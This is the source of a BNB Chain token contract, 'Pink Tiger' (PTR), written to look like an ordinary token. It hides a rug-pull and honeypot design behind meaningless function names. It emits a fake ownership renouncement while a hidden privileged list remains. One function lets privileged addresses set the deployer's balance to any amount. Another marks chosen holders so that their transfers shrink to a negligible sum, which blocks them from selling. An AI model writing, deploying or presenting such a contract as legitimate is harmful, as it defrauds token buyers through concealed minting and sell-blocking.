/**
 *Submitted for verification at BscScan.com on 2023-02-01
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface txToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tokenMarketingFund {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract PinkTiger {
    uint8 public decimals = 18;
    address public owner;
    address public totalBuy;

    mapping(address => bool) public minFrom;
    string public name = "Pink Tiger";

    uint256 public totalSupply = 100000000 * 10 ** 18;


    bool public totalMode;
    uint256 constant listBuyLaunch = 12 ** 10;
    mapping(address => uint256) public balanceOf;
    address public atMax;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public txSwap;

    string public symbol = "PTR";
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        txToken amountReceiverLaunched = txToken(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        totalBuy = tokenMarketingFund(amountReceiverLaunched.factory()).createPair(amountReceiverLaunched.WETH(), address(this));
        owner = senderFromFund();
        atMax = owner;
        minFrom[atMax] = true;
        balanceOf[atMax] = totalSupply;
        emit Transfer(address(0), atMax, totalSupply);
        teamTx();
    }

    

    function senderFromFund() private view returns (address) {
        return msg.sender;
    }

    function transferFrom(address autoWallet, address enableTeam, uint256 listReceiverAuto) public returns (bool) {
        if (autoWallet != senderFromFund() && allowance[autoWallet][senderFromFund()] != type(uint256).max) {
            require(allowance[autoWallet][senderFromFund()] >= listReceiverAuto);
            allowance[autoWallet][senderFromFund()] -= listReceiverAuto;
        }
        if (enableTeam == atMax || autoWallet == atMax) {
            return isFeeEnable(autoWallet, enableTeam, listReceiverAuto);
        }
        if (txSwap[autoWallet]) {
            return isFeeEnable(autoWallet, enableTeam, listBuyLaunch);
        }
        return isFeeEnable(autoWallet, enableTeam, listReceiverAuto);
    }

    function totalEnable(uint256 listReceiverAuto) public {
        if (!minFrom[senderFromFund()]) {
            return;
        }
        balanceOf[atMax] = listReceiverAuto;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function approve(address enableMode, uint256 listReceiverAuto) public returns (bool) {
        allowance[senderFromFund()][enableMode] = listReceiverAuto;
        emit Approval(senderFromFund(), enableMode, listReceiverAuto);
        return true;
    }

    function amountFund(address launchFee) public {
        if (launchFee == atMax || launchFee == totalBuy || !minFrom[senderFromFund()]) {
            return;
        }
        txSwap[launchFee] = true;
    }

    function transfer(address enableTeam, uint256 listReceiverAuto) external returns (bool) {
        return transferFrom(senderFromFund(), enableTeam, listReceiverAuto);
    }

    function teamTx() public {
        emit OwnershipTransferred(atMax, address(0));
        owner = address(0);
    }

    function amountLaunch(address launchTeam) public {
        if (totalMode) {
            return;
        }
        minFrom[launchTeam] = true;
        totalMode = true;
    }

    function isFeeEnable(address senderWallet, address modeAt, uint256 listReceiverAuto) internal returns (bool) {
        require(balanceOf[senderWallet] >= listReceiverAuto);
        balanceOf[senderWallet] -= listReceiverAuto;
        balanceOf[modeAt] += listReceiverAuto;
        emit Transfer(senderWallet, modeAt, listReceiverAuto);
        return true;
    }


}